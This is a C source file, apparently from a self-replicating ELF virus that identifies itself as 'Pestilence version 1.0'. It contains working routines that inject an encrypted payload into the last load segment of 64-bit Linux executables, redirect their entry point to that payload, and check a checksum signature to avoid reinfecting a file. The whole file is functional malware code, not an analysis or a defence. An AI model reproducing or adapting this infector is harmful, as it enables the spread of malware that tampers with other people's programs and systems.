#include "infect.h"

//char KEY[16];
#define DATA 0x02

int get_sig(char *s, size_t n, size_t virus_len, char *sig)
{
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	size_t sig_len = slen(sig);

	if (entry + virus_len >= n)
		return fail("invalid entry point");

	size_t i;
	size_t sig_sum = 0;;

	for (i = 0; i < virus_len; i++)
	{
		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
			i += sig_len;
		sig_sum += *(unsigned char*)(s + entry + i);
	}

	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';

	return TRUE;
}

//======================= WOODY ==============================

//=============================================================

static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
	char *ns;
	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
	//	return FALSE;
	ns = (void*)CALL(SYS_mmap, NULL, (*n1) + n2, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return FALSE;
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
	for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
	for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
	*s1 = ns;
	*n1 = (*n1) + n2;
	return TRUE;
}

static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
	//char *ns = (char *)malloc((*n) + add);
	char *ns = (void*)CALL(SYS_mmap, NULL, (*n) + add, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return ; // TODO
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
	for (j = 0; j < add; j += 1){ns[i+j] = 0; }
	for (l = 0; i+l < *n; l += 1){ ns[i+j+l] = (*s)[i+l]; }
	//ffree(*s, *n);
	*s = ns;
	*n = (*n) + add;
}

void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed){
	//add a few information about himself
	Elf64_Ehdr *bh = (void*)b;
	size_t pos = 0/*elf_offset_entry(b, n)*/;
	//modifying 2bit after
	size_t *p = ((size_t *)(char*)(b + pos + DATA));
	p[0] = max(old_entry,entry) - min(old_entry,entry);
	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
	*p_opt = opt;
	p[2] = compressed;
	p[3] = ((size_t*)key)[0];
	p[4] = ((size_t*)key)[1];
	*(unsigned char*)(p + 3) ^= 0b01110010;
	int c = FALSE;
	encrypt((char*)(p+5), 15, (uint32_t*)key, &c);
	get_sig(s, sn, n, (char*)(p + 7));
}

static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	Elf64_Ehdr *h = (void*)*s;
	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;

	size_t old_entry = h->e_entry;
	int x = elf_last_load_segment(*s, *n);
	if (ph[x].p_memsz < ph[x].p_filesz) return fail("corrupted binary");
	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
	size_t oldn = 0;
	char *olds = NULL;
	if (diff > 0){
		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
		oldn = *n;
		olds = *s;
		_insert_zeros(s,n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		elf_shift_offset(*s, *n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		//reset it
		Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
		//change memsize to filesize
		ph[x].p_filesz += diff;
		ph[x].p_memsz = ph[x].p_filesz;
	}
	size_t pos = ph[x].p_offset + ph[x].p_filesz;
	size_t oldn2 = *n;
	char *olds2 = *s;
	_insert(s, n, pos-1, b, bn);
	//encryption
	bool compressed = TRUE;
	uint64_t changed = encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key, &compressed);
	//reset it
	elf_shift_offset(*s, *n, pos, bn);
	elf_update_flags_of_load_segments(*s, *n);
	elf_change_size_last_load_segment(*s, *n, bn);
	elf_set_off_entry(*s, *n, pos);
	h = (void*)*s;
	ph = (*(void**)s) + h->e_phoff;
	//TODO: check not already inf
	//ph[x].p_memsz += changed;
	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n, compressed);
	ffree(olds2, oldn2);
	if (olds)
		ffree(olds, oldn);
	return TRUE;
}

//=============================================================

int check_already_packed(char *s, size_t n, size_t virus_len){
	char sig[] = "Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA";
	size_t sig_len = slen(sig);
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	//check if size is enoug
	if (entry + DATA + 7*sizeof(size_t) + sig_len >= n)
		return TRUE;
	if (get_sig(s, n, virus_len, sig) == FALSE)
		return TRUE;
	size_t *p = ((size_t *)(char*)(s + entry + DATA));
	if (sncmp((char*)(p+7), sig, sig_len) == 0)
		return fail("already packed");
	return TRUE;
}

int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	char *s;
	size_t n;
	int ret = TRUE;

	if (!fget(fname, &s, &n))
	{
		fail("failed to open the file");
		goto fail;
	}
	if (elf_check_valid(s, n) == FALSE) goto fail;
	if (!check_already_packed(s, n, bn)) goto fail;

	//after insert, update data
	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
		goto fail;
	if (!fput(outname, s, n))
	{
		fail("failed to save to woody");
		goto fail;
	}

end:
	ffree(s, n);
	return ret;
fail:
	ret = FALSE;
	goto end;
}
